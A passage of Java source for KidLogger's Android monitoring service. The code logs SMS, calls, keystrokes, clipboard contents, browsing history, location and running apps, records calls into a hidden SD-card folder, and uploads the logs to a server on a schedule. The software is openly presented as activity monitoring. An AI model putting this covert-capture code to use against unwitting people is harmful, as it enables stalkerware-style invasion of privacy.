/**********************************************************************
** Copyright (C) 2005-2011 Tesline-Service S.R.L.  All rights reserved.
**
** KidLogger - user activity monitoring software.
** 
**
** This file may be distributed and/or modified under the terms of the
** GNU General Public License version 2 as published by the Free Software
** Foundation and appearing in the file LICENSE.GPL included in the
** packaging of this file.
**
** This file is provided AS IS with NO WARRANTY OF ANY KIND, INCLUDING THE
** WARRANTY OF DESIGN, MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
**
** See http://www.kidlogger.net for GPL licensing information and terms of service
**
** Contact help@kidlogger.net if any conditions of this licensing are
** not clear to you.
**
**********************************************************************/
package net.kidlogger.kidlogger;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
//import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.BroadcastReceiver;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.CountDownTimer;
import android.os.Build;
import android.os.IBinder;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.os.RemoteException;
import android.os.SystemClock;
import android.provider.ContactsContract.PhoneLookup;
import android.util.Log;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.media.MediaRecorder.AudioEncoder;
import android.media.MediaRecorder.AudioSource;
import android.media.MediaRecorder.OnInfoListener;
import android.media.MediaRecorder.OutputFormat;
import android.telephony.TelephonyManager;
import android.telephony.PhoneStateListener;
import android.text.ClipboardManager;

import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FilenameFilter;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.RandomAccessFile;
import java.io.IOException;
import java.lang.System;
import java.text.SimpleDateFormat;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
//import org.apache.http.params.BasicHttpParams;
//import org.apache.http.params.HttpConnectionParams;
//import org.apache.http.params.HttpParams;
import org.apache.http.util.EntityUtils;

public class KLService extends Service {
	public static final String PREF_NAME = "net.tesline.service.KLService";
	public static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	public static final String OUTGOING_CALL = "net.tesline.service.OUTGOING_CALL";
	public static final String ALARM_ACTION = "net.tesline.service.SEND_DATA";
	public static String INTENT_NUMBER = "*123456#";
	
	public long beginIdle = 0;
	
	protected static String pStatus = "";
	protected static String FILE_SENT = new String(); // name of sent file
	protected static long SIZE_SENT = 0;			  // size of sent file	
	protected static int MEDIA_BUFF = (1024 * 20); // 20K buff
	protected static int uploadedSize;
	protected static boolean serviceStarted = false;	
	
	protected final Synchronizer sync = new Synchronizer(); // writing and sending logs
	protected final Synchronizer syncMedia = new Synchronizer(); // sending media files	
	
	protected TApplication app;
	protected boolean recording = false;
	protected boolean postSentOk = false;
	protected boolean userPresent = true;
	protected boolean mNoConnectivity = false;
	protected boolean mOffHook = false;
	protected boolean mIsRoaming = false;
	
	private static final String REJECT = "REJECT.";
	private static final String UPDATE = "UPDATE.";
	private static final String BAD_DEV = "BAD_DEV.";
	private static final String NOT_FOUND = "not found";
	
	private final long MIN = 60000L;
	private final long SCAN_TASK_TIME = 14000L;
	private final long SCAN_CLIP_TIME = 30000L;	
	private final boolean PHOTO_LIST = true;
	private final boolean MEDIA_LIST = false;
	
	private String file;
	private final String CN = "KLService.";
	private LocationManager locMngr; 
	//private Timer sendTimer = null; // send log file to remote server
	//private Timer taskTimer;		// check if a new api was started
	//private Timer clipTimer;		// scan clipboard
	private CountDownTimer delayNewCallEvent;
	private File recFile = null;			// current record file
	private Handler handlering = new Handler();
	private Handler handleTask = new Handler();
	private Handler handleClipb = new Handler(); // handle clipboard
	private Handler mHandler;
	private static SmsObserver smsObserver;
	private HistoryObserver urlObserver;
	private WifiReceiver wifiReceiver;
	private ConnectivityReceiver mConReceiver;
	private CallsReceiver callsReceiver;
	private IdleReceiver idleReceiver;
	private UsbReceiver usbReceiver;
	private ShutdownReceiver powerReceiver;
	private MediaReceiver mediaReceiver;
	private GsmObserver gsmObserver;
	private AirplaneReceiver airReceiver;
	//private CallIntentReceiver outCallReceiver;
	private TelephonyManager telManager;
	private KidLocListener locListener;
	private MediaRecorder recorder;
	private PhotoObserver photoObserver;
	private ListFileSync listFileSync;
	private SliceMultimediaFile mediaSlicer = null;
	private BroadcastReceiver timeTick = null;  // Receive TIME_TICK event
	//private BroadcastReceiver dateChanged;	
	private IRemoteService.Stub remoteServiceStub;
	private Runnable clipboardScan;
	private Runnable taskScan;
	private AlarmManager mAlarmManager;
	private PendingIntent mPI;
	//private Runnable mUploadData;	
	//private Runnable r;
	//private final Binder binder = new LocalBinder();	
	//private ITelephony telephonyService;	
	private String prevPack = "";
	private String gsmState = "";
	private String newCallLog = new String(); // is used to log new call
	private String newCallNumber = new String(); // is used to log new call
	private String mLastWifiPointName = "";
	
	//private double latitude = 0;
	//private double longitude = 0;
	private long filePointer = 0;
	private long postSendingFreq;	// POST sending frequency
	private long mLastWifiEventTime = 0;
	
	private int prevClipSize = 0;	// previous clipboard size
	//private int tickCount = 0;		// used to count TIME_TICK events	
	private int maxUploadSize = 0;  // Maximum size of uploaded media files bytes
	
	private boolean newIncoming = false;	  // is used to log new call
	private boolean gpsOn = false;
	private boolean wifiOn = false;
	private boolean smsOn = false;
	private boolean callOn = false;
	private boolean idleOn = false;
	private boolean urlOn = false;
	private boolean usbOn = false;
	private boolean taskOn = false;
	private boolean clipOn = false;
	private boolean powerOn = false;
	private boolean mediaOn = false;
	private boolean gsmOn = false;
	private boolean airOn = false;
	private boolean photoOn = false;
	private boolean uploadOn = false;
	private boolean uploadSizeExceeded = false;
	private boolean stopUploadMedia = false;
	private boolean scanningTask = false;
	private boolean scanningClip = false;
	private boolean logTask = false;
	private boolean logClip = false; // log clipboard
	private boolean loggingIdle = false;
	
	
	@Override
	public void onCreate(){
		//super.onCreate();					
		locMngr = (LocationManager)getSystemService(LOCATION_SERVICE);
		INTENT_NUMBER = Settings.accessKey(this);
		postSendingFreq = Settings.getFreqSend(this) * 60000L;
		maxUploadSize = (int)(Settings.getMaxMediaUpload(this) * 1000000);
		uploadedSize = getIntPref("uploadedSize");
		serviceStarted = true;
		logTask = Settings.loggingTasks(this);
		logClip = Settings.loggingClipboard(this);
		loggingIdle = Settings.loggingIdle(this);
		app = (TApplication)getApplication();
		app.mServiceOnCreate = true;
		//Log.i(CN + "onCreate", "onCreate");
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId){		
		//List file synchronizer
		listFileSync = new ListFileSync(this);
		
		// Check a previous file and send the file if exist
		checkPrevFiles();
		
		// Handle outgoing call delay 
		mHandler = new Handler(){
			public void handleMessage(Message msg){
				String message = (String)msg.obj;
				if(message == null)
					return;
				//Log.i("KLS", "message: " + message);
				if(message.equals("start")){
					delayNewCallEvent = new CountDownTimer(15000L, 1000L){
						public void onTick(long millisUntilFinish){
						}
						
						public void onFinish(){
							new Thread(new Runnable(){
								public void run(){
									//Log.i("KLS", "doAfterDelay");
									doAfterDelay();
								}
							}).start();							
						}
					}.start();
				}else if(message.equals("stop")){
					//Log.i("KLS", "Stop delay");
					if(delayNewCallEvent != null){
						delayNewCallEvent.cancel();
						delayNewCallEvent = null;
					}
				}
			}
		};
		
		// Define a BroadcastReceiver to detect if date is changed
		/*dateChanged = new BroadcastReceiver(){
			public void onReceive(Context context, Intent intent){
				String action = intent.getAction();
						
				if(action != null && action.equals(Intent.ACTION_DATE_CHANGED)){
					new Thread(new Runnable(){
						public void run(){
							checkPrevFiles();
							app.logError(CN, "Date is changed");
						}
					}).start();
				}				
			}
		};
		IntentFilter filter = new IntentFilter(Intent.ACTION_DATE_CHANGED);		
		registerReceiver(dateChanged, filter);*/
		
		// Stub of remote service
		remoteServiceStub = new IRemoteService.Stub(){
			public void sendString(String string) throws RemoteException {
				runKeyEvent(string);
			}
		};		
		
		// Setup things to log
		setupLogging();		
		
		// Uploading files		
		if(Settings.uploadLogs(this)){
			mAlarmManager = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
			
			if(mAlarmManager == null){
				app.logError(CN + "onStartCommand", "Couldn't get AlarmManager");
				uploadOn = false;
			}else{
				//Intent i = new Intent(this, AlarmReceiver.class);
				Intent i = new Intent(KLService.ALARM_ACTION);
				mPI = PendingIntent.getBroadcast(this, 0, i, 0);
				mAlarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, 
						SystemClock.elapsedRealtime(), postSendingFreq, mPI);
			}
				
			//---------------------------------------------------------------------------------
			/*mUploadData = new Runnable(){
				public void run(){
					new Thread(new Runnable(){
						public void run(){
							//doSendingFile();
							doSendHtml();
							checkDate();
							if(!mIsRoaming)
								doSendMedia();
						}
					}).start();
					handlering.postDelayed(mUploadData, postSendingFreq);
				}				
			};
			handlering.postDelayed(mUploadData, postSendingFreq);*/
			//---------------------------------------------------------------------------------
			uploadOn = true;	
		}
		
		// Log power
		boolean powerOn = getBoolPref("powerOff");
		if(powerOn){
			new Thread(new Runnable(){
				public void run(){
					sync.writeLog(".htm", Templates.getPowerLog(false));
				}
			}).start();
			//WriteThread wpl = new WriteThread(sync, ".htm", Templates.getPowerLog(false));
			
			saveToPref("powerOff", false);
		}
		
		// Log start service
		logServiceState(true);
		
		app.mService = this;
		app.mServiceOnCreate = false;
		
		//Log.i(CN + "onStartCommand", "onStartCommand");
				
		return START_STICKY;
	}	
	
	@Override
	public IBinder onBind(Intent intent){
		return remoteServiceStub;
	}	
	
	@Override
	public void onDestroy(){
		super.onDestroy();
		try{
			if(uploadOn && mAlarmManager != null){
				mAlarmManager.cancel(mPI);
			}
			if(taskOn){
				handleTask.removeCallbacks(taskScan);
			}
			if(clipOn){
				handleClipb.removeCallbacks(clipboardScan);
			}
			if(delayNewCallEvent != null){
				delayNewCallEvent.cancel();
			}
			if(gpsOn){
				locMngr.removeUpdates(locListener);
			}	
			if(wifiOn && wifiReceiver != null){
				unregisterReceiver(wifiReceiver);
			}
			if(smsOn && smsObserver != null && smsObserver.inSms != null){
				unregisterReceiver(smsObserver.inSms);
				smsObserver.unregisterObserver();
			}			
			if(callOn && callsReceiver != null){
				unregisterReceiver(callsReceiver);
			}
			if(idleOn && idleReceiver != null){
				unregisterReceiver(idleReceiver);
			}
			if(urlOn && urlObserver != null){
				urlObserver.unregisterObserver();
			}
			if(usbOn && usbReceiver != null){
				unregisterReceiver(usbReceiver);
			}
			if(powerOn && powerReceiver != null){
				unregisterReceiver(powerReceiver);
			}
			if(mediaOn && mediaReceiver != null){
				unregisterReceiver(mediaReceiver);
			}
			if(gsmOn && telManager != null && gsmObserver != null){
				telManager.listen(gsmObserver, PhoneStateListener.LISTEN_NONE);
			}
			if(airOn && airReceiver != null){
				unregisterReceiver(airReceiver);
			}
			if(photoOn && photoObserver != null){
				photoObserver.unregisterObserver();
			}
			
			if(mConReceiver != null)
				unregisterReceiver(mConReceiver);
		}catch(IllegalArgumentException e){
			app.logError(CN + "onDestroy", e.toString());
		}		
		
		saveToPref("fileName", file);
		saveToPref("uploadedSize", uploadedSize);
		
		// Log stop service
		logServiceState(false);
		serviceStarted = false;
		app.mService = null;
		//Log.i(CN + "onDestroy", "onDestroy");
	}
	
	public void setupLogging(){
		// Set up GPS / Network logging		
		if(Settings.loggingGps(this)){
			startGpsUpdates();			
			gpsOn = true;
		}
		
		// Set up WiFi logging
		if(Settings.loggingWifi(this)){			
			wifiReceiver = new WifiReceiver(this);
			registerReceiver(wifiReceiver, new IntentFilter(WifiManager.NETWORK_STATE_CHANGED_ACTION));				
			wifiOn = true;			
		}
		
		// Set up SMS logging
		if(Settings.loggingSms(this)){
			smsObserver = new SmsObserver(this, handlering);				
			IntentFilter smsFilter = new IntentFilter(SMS_RECEIVED);
			registerReceiver(smsObserver.inSms, smsFilter);
			smsOn = true;
		}
		
		// Set up Calls logging
		if(Settings.loggingCalls(this)){
			IntentFilter callsFilter = new IntentFilter(
					TelephonyManager.ACTION_PHONE_STATE_CHANGED);
			
			callsReceiver = new CallsReceiver(this);
			registerReceiver(callsReceiver, callsFilter);
			callOn = true;
		}
		
		// Set up Idle logging
		IntentFilter idleFilter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
		idleFilter.addAction(Intent.ACTION_USER_PRESENT);
		
		idleReceiver = new IdleReceiver(this);
		registerReceiver(idleReceiver, idleFilter);
		idleOn = true;
		/*if(Settings.loggingIdle(this)){
			IntentFilter idleFilter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
			idleFilter.addAction(Intent.ACTION_USER_PRESENT);
			
			idleReceiver = new IdleReceiver(this);
			registerReceiver(idleReceiver, idleFilter);
			idleOn = true;
		}*/
		
		// Set up URL logging
		if(Settings.loggingUrl(this)){
			urlObserver = new HistoryObserver(this, handlering);
			urlOn = true;
		}
		
		// Set up USB logging
		if(Settings.loggingUsb(this)){
			IntentFilter usbFilter = new IntentFilter(Intent.ACTION_UMS_CONNECTED);
			usbFilter.addAction(Intent.ACTION_UMS_DISCONNECTED);
			
			usbReceiver = new UsbReceiver(this);
			registerReceiver(usbReceiver, usbFilter);
			usbOn = true;			
		}
		
		// Set up Tasks logging
		if(logTask){
			// Check if a new Application was started
			taskScan = new Runnable(){
				public void run(){
					new Thread(new Runnable(){
						public void run(){
							doScanTask();
						}
					}).start();
					if(userPresent){
						handleTask.postDelayed(this, SCAN_TASK_TIME);
						scanningTask = true;
					}else{
						scanningTask = false;
					}
				}
			};
			handleTask.postDelayed(taskScan, SCAN_TASK_TIME);
			taskOn = true;
		}
		
		// Set up Clipboard logging
		if(logClip){
			// Scan clipboard content, only first 30 characters
			clipboardScan = new Runnable(){
				public void run(){
					new Thread(new Runnable(){
						public void run(){
							doScanClipboard();
						}
					}).start();
					if(userPresent){
						handleClipb.postDelayed(this, SCAN_CLIP_TIME);
						scanningClip = true;
					}else{
						scanningClip = false;
					}
				}
			};
			handleClipb.postDelayed(clipboardScan, SCAN_CLIP_TIME);
			clipOn = true;
		}
		
		// Set up Power logging
		if(Settings.loggingPower(this)){
			IntentFilter powerFilter = new IntentFilter(Intent.ACTION_SHUTDOWN);
			
			powerReceiver = new ShutdownReceiver(this);
			registerReceiver(powerReceiver, powerFilter);
			powerOn = true;
		}
		
		// Set up Memory Card logging
		if(Settings.loggingMedia(this)){
			IntentFilter mediaFilter = new IntentFilter(Intent.ACTION_MEDIA_REMOVED);
			mediaFilter.addAction(Intent.ACTION_MEDIA_BAD_REMOVAL);
			mediaFilter.addAction(Intent.ACTION_MEDIA_MOUNTED);
			mediaFilter.addAction(Intent.ACTION_MEDIA_UNMOUNTED);
			mediaFilter.addAction(Intent.ACTION_MEDIA_SHARED);
			mediaFilter.addDataScheme("file");
			
			mediaReceiver = new MediaReceiver(this);
			registerReceiver(mediaReceiver, mediaFilter);
							
			mediaOn = true;
		}
		
		// Set up GSM logging
		if(Settings.loggingGsm(this)){
			gsmObserver = new GsmObserver(this);
			telManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
			telManager.listen(gsmObserver, PhoneStateListener.LISTEN_SERVICE_STATE |
					PhoneStateListener.LISTEN_CELL_LOCATION);
			gsmOn = true;			
		}
		
		// Set up Airplane mode receiver
		if(Settings.loggingAir(this)){
			IntentFilter airFilter = new IntentFilter(Intent.ACTION_AIRPLANE_MODE_CHANGED);
			
			airReceiver = new AirplaneReceiver(this);
			registerReceiver(airReceiver, airFilter);
			airOn = true;
		}
		
		// Set up Photos logging
		if(Settings.loggingPhotos(this)){
			photoObserver = new PhotoObserver(this, this, handlering);
			photoOn = true;			
		}
		
		// Set up SliceMultimediaFile
		if(Settings.uploadPhotos(this) || Settings.uploadRecords(this)){
			mediaSlicer = new SliceMultimediaFile(this);						
		}
		
		// Set up ConnectivityReceiver
		mConReceiver = new ConnectivityReceiver(this);
		registerReceiver(mConReceiver, new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION));
		
		// Ser up CallIntentReceiver
		//outCallReceiver = new CallIntentReceiver();
		//registerReceiver(outCallReceiver, new IntentFilter(KLService.OUTGOING_CALL));
	}
	
	private void checkPrevFiles(){
		Date today = new Date();
		String todayIs = String.format(new Locale("en", "US"), "%te %tB,%tA", today, today, today);
		String prevFile = getStrPref("fileName");
		if(prevFile.equals("undefined")){
			saveToPref("fileName", todayIs);
		}else{
			if(!prevFile.equals(todayIs)){
				//file = prevFile;	// set the last file
				file = new String(prevFile);	// set the last file
				doSendHtml();
				//doSendingFile();	// send the rest of the last file to server
				saveToPref("fileName", todayIs);
				saveToPref("filePointer", 0L);  //filePointer = 0;
				deletePrevFiles();
				uploadedSize = 0;
				stopUploadMedia = false;
			}
		}
		//file = todayIs;
		file = new String(todayIs);
	}
	
	private void checkDate(){
		Date today = new Date();
		String todayIs = String.format(new Locale("en", "US"), "%te %tB,%tA", today, today, today);
		String prevFile = getStrPref("fileName");
		if(prevFile.equals("undefined")){
			saveToPref("fileName", todayIs);
		}else{
			if(!prevFile.equals(todayIs)){
				saveToPref("fileName", todayIs);
				saveToPref("filePointer", 0L);  //filePointer = 0;
				deletePrevFiles();
				uploadedSize = 0;
				stopUploadMedia = false;
			}
		}
		file = new String(todayIs);
	}
	
	// Leaves only 5 log files in directory the rest of ones delete
	private void deletePrevFiles(){
		File dir = getFilesDir();
		long oneDay = 86400000L; // One day in milliseconds
		long maxFileAge = oneDay * 5L; // 5 days in milliseconds
		FilenameFilter filter = new FilenameFilter(){
			public boolean accept(File dir, String name){
				return name.contains(".htm");
			}
		};
		
		File[] files = dir.listFiles(filter);
		long lastModified;
		for(File f : files){
			lastModified = f.lastModified();
			//Log.i("KLS", "last " + String.format("%tc", lastModified));
			// delete if file is older than 5 days
			if((lastModified + maxFileAge) < System.currentTimeMillis())
				f.delete();
		}
		
		// Delete audio records from SD
		String rootDir = Environment.getExternalStorageDirectory().getAbsolutePath() +
			"/.callrecords/";
		dir = new File(rootDir);
		files = dir.listFiles();
		maxFileAge = (long)(oneDay * Settings.getKeepRecTime(this));
		if(files != null){
			for(File f : files){
				if(f.isDirectory()){
					lastModified = f.lastModified();
					if((lastModified + maxFileAge) < System.currentTimeMillis()){
						// Delete all files from current directory
						for(File curFile : f.listFiles()){
							curFile.delete();
						}
						// Delete current directory
						f.delete();
					}						
				}
			}
		}				
	}

	private void startGpsUpdates(){
		long minTime = 0;
		float minDist = 0;
		
		try{
			minTime = Long.parseLong(Settings.getGpsUpdatesTime(this));
			minDist = Float.parseFloat(Settings.getMinDistance(this));
		}catch(NumberFormatException e){
			minTime = MIN * 5L;
			minDist = 20.0f;
			app.logError(CN + "startGpsUpdates", e.toString());			
		}
		
		//List<String> locProviders = locMngr.getAllProviders();		
		locListener = new KidLocListener();
		
		if(locMngr.isProviderEnabled(LocationManager.GPS_PROVIDER)){
			locMngr.requestLocationUpdates(LocationManager.GPS_PROVIDER, minTime * MIN,
					minDist, locListener);
			//Log.i(CN, "GPS location");
		}
		else if(locMngr.isProviderEnabled(LocationManager.NETWORK_PROVIDER)){
			locMngr.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 
					minTime * MIN, minDist, locListener);
			//Log.i(CN, "Network location");
		}
		else
			gpsOn = false;
		
		
		/*
		if(gpsOn)
			locMngr.removeUpdates(onLocationChange);
		
		try{
			locMngr.requestLocationUpdates(LocationManager.GPS_PROVIDER, minTime * MIN,
					minDist, onLocationChange);
			//locMngr.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, minTime * MIN,
			//		minDist, onLocationChange);
			Log.i("KLS", "Min time: " + minTime + "min dist: " + minDist);
		}catch(IllegalArgumentException e){
			app.logError(CN + "startGpsUpdates", e.toString());
		}catch(SecurityException e){
			app.logError(CN + "startGpsUpdates", e.toString());
		}
		*/
	}
	
	// Create thread which save calls to file
	public void runCallEvent(final String callType, final String call, final boolean incoming){
		if(call == null)
			return;
		
		new Thread(new Runnable(){
			public void run(){
				if(callType != null && call != null){
					// Return if it's launch call event
					if(call.equals(INTENT_NUMBER))
						return;
					
					String callLog = callType;			
					// Get name from Contacts if set loggingContact
					if(Settings.loggingContact(KLService.this))
						callLog += getNameFromContacts(call, false);
					else
						callLog += call;
					
					// Create a delay only for new call log
					if(callType.equals(CallsReceiver.NEW_CALL)){
						mOffHook = true;
						newCallLog = new String(callLog);
						newCallNumber = new String(call);
						newIncoming = incoming;
						Message msg = mHandler.obtainMessage(1, (String)"start");
						mHandler.sendMessage(msg);					
					}else{
						sync.writeLog(".htm", Templates.getCall(new String(callLog), incoming));						
					}
				}
			}
		}).start();			
	}
	
	// Launched from SmsObserver.onChange method and from BroadcastReceiver
	public void runSmsEvent(String address, final String body, final boolean incoming){
		final String addr = getNameFromContacts(address, false);
		new Thread(new Runnable(){
			public void run(){
				sync.writeLog(".htm", Templates.getSmsTag(addr, body, incoming));
			}
		}).start();
		//WriteThread wts = new WriteThread(sync, ".htm",	Templates.getSmsTag(addr, body, incoming));
	}
	
	// Launched from HistoryObserver.onChange method
	public void runHistoryEvent(final String url){
		new Thread(new Runnable(){
			public void run(){
				sync.writeLog(".htm", Templates.getUrlLog(url));
			}
		}).start();
		//WriteThread wturl = new WriteThread(sync, ".htm", Templates.getUrlLog(url));
	}
	
	// Launched from BroadcastReceiver
	public void runIdleEvent(){
		new Thread(new Runnable(){
			public void run(){
				//long idle = System.currentTimeMillis() - beginIdle;
				final long currTime = new Date().getTime();
				final long idle = currTime - beginIdle;
				if(loggingIdle){
					if(idle > MIN && beginIdle > 0){
						final long bgIdle = beginIdle;
						new Thread(new Runnable(){
							public void run(){
								sync.writeLog(".htm", Templates.getIdle(idle, bgIdle, currTime));
							}
						}).start();
						//WriteThread wti = new WriteThread(sync, ".htm",
						//		Templates.getIdle(idle, beginIdle, currTime));
					}
				}		
				
				if(logTask && !scanningTask)
					handleTask.postDelayed(taskScan, SCAN_TASK_TIME);
				if(logClip && !scanningClip)
					handleClipb.postDelayed(clipboardScan, SCAN_CLIP_TIME);
			}
		}).start();		
	}
	
	// Launched from BroadcastReceiver
	public void runUsbEvent(final boolean connected){
		new Thread(new Runnable(){
			public void run(){
				sync.writeLog(".htm", Templates.getUsbLog(connected));
			}
		}).start();
	}
	
	// Launched from WifiReceiver.onRecieve method
	/*public void runWifiEvent(String state){
		mLastWifiEventTime = System.currentTimeMillis();
				
		final byte[] buff = Templates.getWifiLog(state);		
		new Thread(new Runnable(){
			public void run(){
				sync.writeLog(".htm", buff);
			}
		}).start();
	}*/
	
	public void runWifiEvent(final String state, final String point){
		new Thread(new Runnable(){
			public void run(){
				long currTime = System.currentTimeMillis();
				long diff = currTime - mLastWifiEventTime;
				
				if(!mLastWifiPointName.equalsIgnoreCase(point) && diff > 1200000L){
					mLastWifiPointName = new String(point);
					mLastWifiEventTime = currTime;
					sync.writeLog(".htm", Templates.getWifiPoint(state, point));			
				}
			}
		}).start();				
	}
	
	// Launched from ShutdownReceiver
	public void runShutdownEvent(){
		saveToPref("powerOff", true);
		try{
			Thread off = new Thread(new Runnable(){
				public void run(){
					sync.writeLog(".htm", Templates.getPowerLog(true));
				}
			});
			off.start();
			off.join();
		}catch(InterruptedException e){
			app.logError(CN + "runShutdownEvent", e.toString());
		}
		
		// Stop service itself
		this.stopSelf();
	}
	
	// Launched from MediaReceiver
	public void runMediaEvent(final String state){
		new Thread(new Runnable(){
			public void run(){
				sync.writeLog(".htm", Templates.getMediaLog(state));
			}
		}).start();
	}
	
	// Launched from GsmObserver
	public void runGsmEvent(final String state, final String operator){
		if(state.equals(gsmState))
			return;
		else
			gsmState = new String(state);
		
		new Thread(new Runnable(){
			public void run(){
				byte[] buff;
						
				if(operator.equals("undefined"))
					buff = Templates.getGsmLog(state);
				else
					buff = Templates.getGsmLog(state, operator);
				
				sync.writeLog(".htm", buff);
			}
		}).start();
	}
	
	// Launched from AirplaneReceiver
	public void runAirEvent(final boolean state){
		new Thread(new Runnable(){
			public void run(){
				sync.writeLog(".htm", Templates.getAirMode(state));
			}
		}).start();		
	}
	
	// Launched from IRemoteService
	public void runKeyEvent(String string){
		if(Settings.loggingKey(this)){
			final String str = new String(string);
			new Thread(new Runnable(){
				public void run(){
					sync.writeLog(".htm", Templates.getKeystroke(str));
				}
			}).start();
			//WriteThread wks = new WriteThread(sync, ".htm", 
			//		Templates.getKeystroke(string));
		}
	}
	
	// Launched from PhotoObserver
	public void runPhotoEvent(String path, String name, String mime){
		if(Settings.loggingPhotos(this)){
			// Write log			
			final String sn = new String(name);
			new Thread(new Runnable(){
				public void run(){
					sync.writeLog(".htm", Templates.getPhotos(sn));
				}
			}).start();
		}
		
		/*if(Settings.uploadPhotos(this) && !uploadSizeExceeded){
			// Add name of photo to listFiles.txt
			final String fPath = path;
			new Thread(new Runnable(){
				public void run(){
					listFileSync.addFileName(fPath, PHOTO_LIST);
				}
			}).start();		
		}*/
	}
	
	// Launched from ConnectivityReceiver
	public void runRoamingEvent(){
		new Thread(new Runnable(){
			public void run(){
				TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
				try{
					String country = tm.getNetworkCountryIso();
					String operator = tm.getNetworkOperatorName();
					sync.writeLog(".htm", Templates.getRoamingInfo(country.toUpperCase(Locale.US), operator));
				}catch(Exception e){
					app.logError(CN + "runRoamingEvent", e.toString());
				}
			}
		}).start();
	}
	
	private String sanityNumber(String number){
		String out = new String();
		if(!number.equals("")){
			for(char ch : number.toCharArray()){
				switch(ch){
				case ' ':
					out += '_';
					break;
				case '+':
					break;
				case '*':
					out += 'x';
					break;
				case '#':
					out += 'x';
					break;	
				case '~':
					break;
				case '%':
					break;				
				default:
					out += ch;
				}
			}
		}else
			out = "undefined";
		
		return out;
	}
	
	// Start record voice call
	public void startRecord(final String callType, final String callNumber){
		//Log.i("KLS", "startRecord");
		new Thread(new Runnable(){
			public void run(){
				String rootDir = Environment.getExternalStorageDirectory().getAbsolutePath();
				String path = rootDir + "/.callrecords/" + getDateString();
				String name = new String();
				String tmp = getNameFromContacts(callNumber, true);
				if(tmp.equals("unknown"))
					name = sanityNumber(callNumber) + "_";
				else
					name = sanityNumber(tmp) + "_";
				
				recFile = new File(path, callType + name + getTimeString() + ".3gp");
				
				File directory = recFile.getParentFile();
				//Log.i("KLS", "Audio: " + recFile.getName());
				String state = Environment.getExternalStorageState();
				
				if(!state.equals(Environment.MEDIA_MOUNTED))
					return;
				
				if(!directory.exists())
					directory.mkdirs();
				
				recording = true;
				// Initialize recorder
				recorder = new MediaRecorder();
				try{
					recorder.setAudioSource(AudioSource.VOICE_UPLINK);
					recorder.setOutputFormat(OutputFormat.THREE_GPP);
					recorder.setAudioEncoder(AudioEncoder.DEFAULT);
					recorder.setOutputFile(recFile.getAbsolutePath());
					recorder.setMaxDuration(Settings.getMaxTimeRec(KLService.this));
					recorder.setMaxFileSize(Settings.getMaxSizeRec(KLService.this));
					recorder.setOnInfoListener(new MediaInfoListener());
					recorder.prepare();
					recorder.start();
				}catch(IllegalStateException e){
					recording = false;
					app.logError("AudioRecordThread", e.toString());
				}catch(IOException e){
					recording = false;
					app.logError("AudioRecordThread", e.toString());
				}
			}
		}).start();
		
		
		// Start recording
		/*new Thread(new Runnable(){
			public void run(){
				recording = true;
				// Initialize recorder
				recorder = new MediaRecorder();
				try{
					recorder.setAudioSource(AudioSource.VOICE_UPLINK);
					recorder.setOutputFormat(OutputFormat.THREE_GPP);
					recorder.setAudioEncoder(AudioEncoder.AMR_NB);
					recorder.setOutputFile(recFile.getAbsolutePath());
					recorder.setMaxDuration(Settings.getMaxTimeRec(KLService.this));
					recorder.setMaxFileSize(Settings.getMaxSizeRec(KLService.this));
					recorder.setOnInfoListener(new MediaInfoListener());
					recorder.prepare();
					recorder.start();
				}catch(IllegalStateException e){
					recording = false;
					app.logError("AudioRecordThread", e.toString());
				}catch(IOException e){
					recording = false;
					app.logError("AudioRecordThread", e.toString());
				}
			}
		}).start();*/
		
		/*AudioRecordThread art = new AudioRecordThread("record", recFile);
		try{
			art.t.join();
		}catch(InterruptedException e){
			app.logError(CN + "startRecord", e.toString());
		}*/
	}
	
	// Stop record voice call
	public synchronized void stopRecord(){
		//Log.i("KLS", "stopRecord");
		new Thread(new Runnable(){
			public void run(){
				if(recording && recorder != null){
					//Log.i("stopRecord", "stop recording");
					try{
						recorder.stop();
						recorder.release();
						recorder = null;
						
						// Write record log
						sync.writeLog(".htm", Templates.getRecord(recFile.getName()));
						
						// Add file to listFile
						if(Settings.uploadRecords(KLService.this) && !uploadSizeExceeded){
							final String path3gp = recFile.getAbsolutePath();
							listFileSync.addFileName(path3gp, MEDIA_LIST);					
						}
					}catch(Exception e){
						app.logError(CN + "stopRecord", e.toString());
					}finally{
						recording = false;
						recFile = null;
					}
				}
			}
		}).start();		
	}
	
	private String getDateString(){
		SimpleDateFormat formatter = new SimpleDateFormat("dd-MMMM-yy");
		Date now = new Date();
		
		return formatter.format(now);
	}
	
	private String getTimeString(){
		SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy_kk-mm");
		Date now = new Date();
		
		return formatter.format(now);
	}
	
	// Stop timer of doLogNewCall TimerTask
	protected void stopLogNewCall(){
		Message msg = mHandler.obtainMessage(2, (String)"stop");
		mHandler.sendMessage(msg);	
